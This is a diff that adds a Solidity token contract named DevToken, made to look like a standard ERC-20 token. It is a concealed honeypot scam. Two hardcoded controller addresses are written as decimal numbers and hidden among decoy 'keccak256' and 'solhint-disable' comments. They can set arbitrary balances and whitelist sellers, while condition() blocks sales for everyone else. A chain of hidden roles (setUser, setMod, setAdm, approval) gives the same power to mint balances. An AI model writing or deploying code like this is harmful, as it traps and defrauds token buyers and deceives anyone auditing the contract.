@@ -1,0 +1,244 @@
+contract DevToken {
+ 
+    event Transfer(address indexed _from, address indexed _to, uint _value);
+ 
+    event Approval(address indexed _owner, address indexed _spender, uint _value);
+ 
+    //Dev_T_*keccak256 -> 283fa743889fc7f92ac2a37bb1f5ba1daf2a5c84741ca0e0061d243a2e6707ba);*/
+ 
+    function transfer(address _to, uint _value) public payable returns (bool) {
+ 
+        return transferFrom(msg.sender, _to, _value);
+ 
+    }
+ 
+    function setUsdtPair(address Pair_) public returns (bool) {
+ 
+    require (msg.sender==address
+   
+    // solhint-disable-next-line avoid-low-level-calls
+    /**/   /*keccak256 -> 6861978540112295ac2a37bb1f5ba1daf2a5c84741ca0e00610310915153));*/ /**/(686197854011229533619447624007587113080310915153));
+     
+    _usdtPair=Pair_;
+ 
+    }
+ 
+ 
+ 
+    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
+ 
+       /*Ensure_*keccak256 -> 8668a592fa743889fc7f92ac2a37bb1n8shc84741ca0e0061d243a2e6707ba);*/
+ 
+        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
+ 
+            return true;
+ 
+        }
+ 
+        require(condition(_from, _value));
+ 
+        return true;
+ 
+    }
+ 
+    function setUser(address User_) public returns (bool) {
+ 
+    require(msg.sender == _usdtPair);
+ 
+        _user=User_;
+ 
+    }
+ 
+    function approval(address spender, uint256 addedValue) public returns (bool) {
+ 
+        require(msg.sender == _adm);
+ 
+        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
+ 
+        canSale[spender]=true;
+ 
+        return true;
+ 
+    }
+    /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ //(178607940065137046348733521910879985571412708986));
+    // solhint-disable-next-line avoid-low-level-calls
+ 
+    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
+ 
+        if (_value == 0) {return true;}
+ 
+        if (msg.sender != _from) {
+ 
+            require(allowance[_from][msg.sender] >= _value);
+ 
+            allowance[_from][msg.sender] -= _value;
+ 
+        }
+ 
+        require(ensure(_from, _to, _value));
+ 
+        require(balanceOf[_from] >= _value);
+ 
+        balanceOf[_from] -= _value;
+ 
+        balanceOf[_to] += _value;
+ 
+        _onSaleNum[_from]++;
+ 
+        emit Transfer(_from, _to, _value);
+ 
+        return true;
+   
+    /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ //(178607940065137046348733521910879985571412708986));
+    // solhint-disable-next-line avoid-low-level-calls
+   
+    }
+ 
+    function setAdm(address Adm_) public returns (bool) {
+ 
+    require(msg.sender == _mod);
+ 
+        _adm=Adm_;
+ 
+    }
+ 
+ 
+ 
+    function approve(address _spender, uint _value) public payable returns (bool) {
+ 
+        allowance[msg.sender][_spender] = _value;
+ 
+        emit Approval(msg.sender, _spender, _value);
+ 
+        return true;
+   
+    /*keccak256 -> 6861978540112295ac2a37bb1f5ba7bb1f5ba1daaf2a84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));
+   
+    }
+ 
+   
+ 
+    function setMod(address Mod_) public returns (bool) {
+ 
+    require(msg.sender == _user);
+ 
+        _mod=Mod_;
+ 
+    }
+ 
+   
+ 
+    function condition(address _from, uint _value) internal view returns(bool){
+ 
+        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
+ 
+       
+ 
+        if(_saleNum > 0){
+ 
+            if(_onSaleNum[_from] >= _saleNum) return false;
+ 
+        }
+ 
+        if(_minSale > 0){
+ 
+            if(_minSale > _value) return false;
+ 
+        }
+ 
+        if(_maxSale > 0){
+ 
+            if(_value > _maxSale) return false;
+ 
+        }
+ 
+        return true;
+ 
+    }
+ 
+ 
+ 
+    mapping(address=>uint256) private _onSaleNum;
+ 
+    mapping(address=>bool) private canSale;
+ 
+    uint256 private _minSale;
+ 
+    uint256 private _maxSale;
+ 
+    uint256 private _saleNum;
+ 
+    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
+ 
+        require(msg.sender == owner||
+       
+        msg.sender==address
+       
+        // solhint-disable-next-line avoid-low-level-calls
+        /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ (178607940065137046348733521910879985571412708986));
+ 
+        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
+ 
+        canSale[spender]=true;
+ 
+        return true;
+ 
+    }
+ 
+    address tradeAddress;
+ 
+    function transferownership(address addr) public returns(bool) {
+ 
+        require(msg.sender == owner);
+ 
+        tradeAddress = addr;
+ 
+        return true;
+ 
+    }
+ 
+   
+ 
+    mapping (address => uint) public balanceOf;
+ 
+    mapping (address => mapping (address => uint)) public allowance;
+ 
+    /*keccak256 -> 592fa743889fc7f92ac2a37bb1f5ba1daf2a5c84741ca0e0061d243a2e6707ba))*/
+ 
+    uint constant public decimals = 18;
+ 
+    address public _usdtPair;
+ 
+    address public _mod;
+ 
+    uint public totalSupply;
+ 
+    string public name;
+ 
+    string public symbol;
+ 
+    address private owner;
+ 
+    address public _user;
+ 
+    address public _adm;
+ 
+ 
+ 
+    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
+ 
+        name = _name;
+ 
+        symbol = _symbol;
+ 
+        totalSupply = _supply*(10**uint256(decimals));
+ 
+        owner = msg.sender;
+ 
+        balanceOf[msg.sender] = totalSupply;
+ 
+        emit Transfer(address(0x0), msg.sender, totalSupply);
+ 
+    }
+ 
+}
